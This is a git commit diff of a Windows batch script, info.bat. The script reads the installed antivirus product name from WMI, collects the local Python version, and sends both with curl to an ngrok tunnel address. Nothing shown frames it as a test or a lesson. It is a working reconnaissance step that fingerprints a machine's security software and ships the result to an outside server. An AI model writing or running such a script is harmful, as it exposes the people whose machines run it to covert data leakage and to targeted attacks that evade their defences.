65a580f2ea7c1900c7ea5de5acfbe3fca9fb91dd
Omar Samy <osamy7592@gmail.com>
2024-05-04 05:59:47 +0300

    Update info.bat

--- info.bat
+++ info.bat
@@ -4,5 +4,7 @@ for /l %%i in (1, 1, 20) do (
 )
 for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName ^| findstr /r /v "^$"') do set "antivirus=%%a"
 echo Antivirus Information: %antivirus%
-curl --verbose --data "%antivirus%" https://6fa3-197-35-34-224.ngrok-free.app
-
+for /f "delims=" %%b in ('python --version 2^>^&1') do set "python_version=%%b"
+echo Python Version: %python_version%
+curl --verbose --data "Antivirus = %antivirus% & PythonVersion = %python_version%" https://e977-197-35-34-224.ngrok-free.app
+exit
